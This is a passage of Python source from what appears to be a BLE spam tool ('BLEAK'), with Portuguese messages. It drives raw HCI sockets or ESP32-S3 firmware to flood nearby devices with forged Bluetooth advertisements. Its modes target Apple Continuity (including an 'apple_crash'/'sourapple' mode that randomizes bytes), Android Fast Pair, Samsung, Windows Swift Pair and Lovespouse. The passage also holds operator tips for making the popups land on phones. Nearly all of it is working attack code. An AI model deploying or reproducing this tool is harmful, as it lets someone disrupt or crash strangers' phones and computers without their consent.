        return [("Lovespouse OFF", LOVE_OFF if isinstance(LOVE_OFF, bytes) else bytes(LOVE_OFF))]

    if t == "sourapple":
        return APPLE_CRASH if "APPLE_CRASH" in dir() else APPLE

    if t == "apple_action":
        return APPLE_ACTION

    # Default: apple
    return APPLE


def start_spam(attack_type: str, duration: int = 30, dev_id: int = 0,
               broadcast: bool = True, target_macs: list = None,
               use_esp32: bool = False) -> dict:
    """Start BLE spam.

    Routing priority (Realtek + S3 optimized):
      1. pybluez raw HCI  — all types (Apple, Android, Samsung, Windows)
         Uses Realtek RTL8761BUV via HCI socket directly.
         Apple:   ADV_NONCONN_IND, 20ms — fast popup
         Android: ADV_IND, 100ms + SCAN_RSP — Google Fast Pair spec
         Samsung: ADV_IND FP + EasySetup with name in SCAN_RSP
         Windows: ADV_NONCONN_IND manufacturer data 0x0006
      2. ESP32-S3 NimBLE  — if pybluez unavailable (fallback)
      3. Error            — neither available
    """
    global _spam_running, _spam_log, _spam_stats

    # Auto-reset stale state (e.g. if previous thread crashed without cleanup)
    if _spam_running:
        import subprocess as _chk
        # Check if there's actually an HCI advertising active
        try:
            r = _chk.run(["hciconfig", "--all"], capture_output=True, text=True, timeout=3)
            # If bluetoothd is up and running, the previous spam likely finished
            if "UP RUNNING" in r.stdout:
                _spam_running = False  # safe to reset — no active HCI spam
            else:
                return {"started": False, "error": "Spam já está em execução. Use Parar primeiro."}
        except Exception:
            _spam_running = False  # reset on error — better to try than block forever

    attack_type = attack_type.lower().strip()
    _spam_running = True
    _spam_log.clear()
    _spam_stats = {"packets": 0, "errors": 0, "started": datetime.now().isoformat(),
                   "type": attack_type, "engine": None}

    # ── Resolve HCI adapter index ─────────────────────────────────────────────
    hci_id = dev_id
    try:
        from web_server import HCI_IFACE as _hi
        hci_id = int(_hi.replace("hci", "")) if _hi.startswith("hci") and _hi[3:].isdigit() else 0
    except Exception:
        pass

    # ── Try pybluez/raw HCI (Realtek RTL8761BUV — preferred unless ESP32 forced)
    # pybluez check — also try socket-based HCI as fallback (no pybluez needed)
    try:
        import bluetooth._bluetooth as _bz_test  # noqa
        _pybluez_ok = True
    except ImportError:
        # Try pure socket HCI — works without pybluez if we have CAP_NET_RAW
        try:
            import socket as _sk_test
            _s = _sk_test.socket(_sk_test.AF_BLUETOOTH, _sk_test.SOCK_RAW,
                                  _sk_test.BTPROTO_HCI)
            _s.close()
            _pybluez_ok = True  # socket HCI works — _send_hci will use it
        except Exception:
            _pybluez_ok = False

    if _pybluez_ok and not use_esp32:
        payloads = _get_payloads(attack_type)

        def _run_hci():
            global _spam_running
            # Step 1: stop bluetoothd + release adapter
            _stop_bluetoothd()
            time.sleep(1.2)  # kernel needs time to release exclusive lock

            # Step 2: open ONE persistent HCI socket for the full duration
            # Opening per-packet causes race conditions and is slow
            try:
                from web_server import HCI_IFACE as _hi2
            except Exception:
                _hi2 = "hci0"
            _hci_id2 = int(_hi2.replace("hci", "")) if _hi2.startswith("hci") and _hi2[3:].isdigit() else 0
            _sock, _mode = _hci_open(_hci_id2)
            if _sock is None:
                logger.error("Cannot open HCI socket — is BLEAK running as root?")
                _spam_running = False
                _spam_stats["engine"] = "error"
                _spam_stats["error"] = "HCI socket failed. Run: sudo ./run_web_lan.sh"
                _restart_bluetoothd()
                return

            logger.info("HCI spam started: mode=%s adapter=%s type=%s", _mode, _hi2, attack_type)
            _spam_stats["engine"] = "hci-" + _mode

            try:
                end_t = time.time() + duration
                idx = 0
                while _spam_running and time.time() < end_t:
                    name, data = payloads[idx % len(payloads)]

                    # Route by attack type to correct HCI sender
                    # Use persistent socket (_sock, _mode) instead of opening per-packet
                    if attack_type in ("android", "android_random", "android_mixed"):
                        adv = _make_fp_adv(bytes(data[4:7]) if len(data) >= 7 else bytes(data[:3]))
                        sr  = _make_scan_rsp(name)
                        ok  = _send_hci_fastpair(_hci_id2, adv, sr, sock=_sock, mode=_mode)

                    elif attack_type in ("samsung", "samsung_buds"):
                        if idx % 3 == 0:
                            ok = _send_hci(_hci_id2, bytes(data), sock=_sock, mode=_mode)
                        else:
                            adv = _make_fp_adv(bytes(data[4:7]) if len(data) >= 7 else bytes(data[:3]))
                            ok  = _send_hci_fastpair(_hci_id2, adv, _make_scan_rsp("Galaxy Buds"), sock=_sock, mode=_mode)

                    elif attack_type == "samsung_watch":
                        if idx % 3 == 0:
                            ok = _send_hci(_hci_id2, bytes(data), sock=_sock, mode=_mode)
                        else:
                            adv = _make_fp_adv(bytes(data[4:7]) if len(data) >= 7 else bytes(data[:3]))
                            ok  = _send_hci_fastpair(_hci_id2, adv, _make_scan_rsp("Galaxy Watch"), sock=_sock, mode=_mode)

                    elif attack_type in ("kitchen", "all"):
                        t = idx % 5
                        if t == 0:
                            ok = _send_hci(_hci_id2, bytes(data), sock=_sock, mode=_mode,
                                           hold_s=0.18, interval=0x00C8)
                        elif t == 1:
                            fp_pl = GFASTPAIR[idx % GFASTPAIR_N]
                            ok  = _send_hci_fastpair(_hci_id2, _make_fp_adv(bytes(fp_pl[4:7])),
                                                     _make_scan_rsp(GFASTPAIR_NAMES[idx % GFASTPAIR_N]),
                                                     sock=_sock, mode=_mode)
                        elif t == 2:
                            sb = SBUDS[idx % SBUDS_N]
                            ok  = _send_hci_fastpair(_hci_id2, _make_fp_adv(bytes(sb[4:7])),
                                                     _make_scan_rsp(SBUDS_NAMES[idx % SBUDS_N]),
                                                     sock=_sock, mode=_mode)
                        elif t == 3:
                            ok = _send_hci(_hci_id2, bytes(MSFT[idx % MSFT_N]), sock=_sock, mode=_mode)
                        else:
                            sw = SWATCH[idx % SWATCH_N]
                            ok  = _send_hci_fastpair(_hci_id2, _make_fp_adv(bytes(sw[4:7])),
                                                     _make_scan_rsp(SWATCH_NAMES[idx % SWATCH_N]),
                                                     sock=_sock, mode=_mode)
                    else:
                        # Apple, Windows, Lovespouse — non-connectable ADV_NONCONN_IND
                        if attack_type in ("apple", "apple_action", "apple_crash", "sourapple"):
                            if attack_type in ("apple_crash", "sourapple") and data:
                                mutable = bytearray(data[:31])
                                if len(mutable) > 8:
                                    mutable[7] = random.randrange(256)
                                    mutable[8] = random.randrange(256)
                                data = bytes(mutable)
                            ok = _send_hci(_hci_id2, bytes(data), sock=_sock, mode=_mode,
                                           hold_s=1.85, interval=0x00C8,
                                           random_addr=True)
                        else:
                            ok = _send_hci(_hci_id2, bytes(data), sock=_sock, mode=_mode)

                    _spam_stats["packets"] += 1
                    if not ok:
                        _spam_stats["errors"] += 1
                    if idx % 10 == 0:
                        _spam_log.append({"time": datetime.now().isoformat(),
                                          "type": attack_type, "device": name, "ok": ok})
                    if len(_spam_log) > 100:
                        _spam_log[:] = _spam_log[-100:]
                    idx += 1
                    # Small yield to avoid blocking Flask
                    if idx % 50 == 0:
                        time.sleep(0.001)

            finally:
                _spam_running = False
                _spam_stats["completed"] = datetime.now().isoformat()
                try:
                    _hci_adv_stop(_sock, _mode)
                    _sock.close()
                except Exception:
                    pass
                _restart_bluetoothd()

        threading.Thread(target=_run_hci, daemon=True).start()
        engine_label = "pybluez-hci (Realtek)"
        _spam_stats["engine"] = engine_label
        return {"started": True, "engine": engine_label,
                "attack_type": attack_type, "duration": duration,
                "note": "Realtek RTL8761BUV via raw HCI — todas as plataformas"}

    # ── Fallback: ESP32-S3 NimBLE ─────────────────────────────────────────────
    try:
        _known_port = None
        try:
            _ws = _web_server_module()
            _known_port = getattr(_ws, "ESP32_PORT", None) if _ws else None
            if _known_port:
                import os as _os_port
                if not _os_port.path.exists(_known_port):
                    _known_port = None
        except Exception:
            pass

        esp, _esp_port = _get_or_reconnect_esp32(known_port=_known_port)
        if esp and esp.connected:
            # Check firmware supports the requested attack type
            if attack_type in ANDROID_FIXED_ATTACKS:
                fw_ok, fw_text = _firmware_has_android_fix(esp)
                if not fw_ok:
                    _spam_running = False
                    return {"started": False, "engine": "esp32-nimble",
                            "port": esp.port, "attack_type": attack_type,
                            "error": ("Firmware ESP32 antigo para testes Android/Samsung: " + fw_text + "\n"
                                      "Grave o firmware BLEAK ESP32 v5.2+ em esp32_firmware/.")}

            sr = esp.start_spam(attack_type, duration)
            if sr.get("success"):
                _spam_stats["engine"] = "esp32-nimble"
                def _poll_esp(e=esp):
                    global _spam_running
                    end_t = time.time() + duration + 1.0
                    while _spam_running:
                        s = e.get_spam_status()
                        _spam_stats["packets"] = s.get("packets", 0)
                        if time.time() >= end_t or not s.get("running"):
                            _spam_running = False
                            _spam_stats["completed"] = datetime.now().isoformat()
                            try:
                                s = e.get_spam_status()
                                _spam_stats["packets"] = max(_spam_stats.get("packets", 0), s.get("packets", 0))
                            except Exception:
                                pass
                            break
                        time.sleep(0.5)
                threading.Thread(target=_poll_esp, daemon=True).start()
                return {"started": True, "engine": "esp32-nimble",
                        "port": _esp_port, "attack_type": attack_type,
                        "note": "Fallback ESP32-S3 NimBLE (pybluez indisponível)"}
            else:
                _spam_running = False
                return {"started": False, "engine": "esp32-nimble",
                        "port": _esp_port or getattr(esp, "port", None),
                        "attack_type": attack_type,
                        "error": sr.get("response", "ESP32 não respondeu ao comando AT+SPAM")}
        else:
            _spam_running = False
            if use_esp32:
                try:
                    import glob as _gl_hint
                    ports_hint = sorted(_gl_hint.glob("/dev/ttyUSB*")) + sorted(_gl_hint.glob("/dev/ttyACM*"))
                except Exception:
                    ports_hint = []
                port_hint = _known_port or (ports_hint[0] if ports_hint else "/dev/ttyUSB0")
                return {"started": False, "engine": "esp32-nimble",
                        "port": port_hint, "attack_type": attack_type,
                        "error": ("ESP32-S3 não respondeu em {}. A porta foi detectada, "
                                  "mas o firmware não aceitou AT+SPAM. Rode Test S3, "
                                  "verifique AT+VERSION e feche qualquer monitor serial aberto."
                                  ).format(port_hint)}
            return {"started": False, "engine": "none",
                    "error": ("pybluez não instalado e ESP32-S3 não respondeu.\n"
                              "Instale pybluez: pip install pybluez\n"
                              "Ou conecte/teste a ESP32-S3.")}
    except Exception as e:
        _spam_running = False
        return {"started": False, "engine": "none", "error": str(e)}


def stop_spam() -> dict:
    global _spam_running
    _spam_running = False
    _restart_bluetoothd()
    return {"stopped": True, "stats": dict(_spam_stats)}


def get_spam_status() -> dict:
    return {
        "running": _spam_running,
        "stats": dict(_spam_stats),
        "log": _spam_log[-20:],
    }


def _operator_hint(attack_type: str) -> str:
    if attack_type in ("android", "android_random"):
        return ("Android: mantenha a tela ligada/desbloqueada, Bluetooth e Nearby/Dispositivos por perto ativos, "
                "deixe o ESP32 a menos de 1 metro e aguarde 10-20s. Android recente pode suprimir popups repetidos.")
    if attack_type in ("samsung", "samsung_buds", "samsung_watch"):
        return ("Samsung: teste com tela ligada/desbloqueada, Bluetooth ativo e Nearby device scanning ativado. "
                "O firmware alterna Fast Pair e Samsung EasySetup para compatibilidade com Android 11+.")
    return ""


ATTACK_PROFILES = {
    "android": {
        "name": "Android Fast Pair",
        "target_os": "Android",
        "payloads": {name: data.hex() for name, data in ANDROID},
    },
    "android_random": {
        "name": "Android Fast Pair Random",
        "target_os": "Android",
        "payloads": {"random_model_id": "06162cfeXXXXXX"},
    },
    "samsung_buds": {
        "name": "Samsung Buds",
        "target_os": "Samsung Android",
        "payloads": {name: data.hex() for name, data in SAMSUNG},
    },
    "samsung_watch": {
        "name": "Samsung Watch",
        "target_os": "Samsung Android",
        "payloads": {"galaxy_watch": "fast_pair+easysetup"},
    },
    "windows": {
        "name": "Windows Swift Pair",
        "target_os": "Windows",
        "payloads": {name: data.hex() for name, data in WINDOWS},
    },
    "apple": {
        "name": "Apple Continuity",
        "target_os": "iOS/macOS",
        "payloads": {name: data.hex() for name, data in APPLE},
    },
}
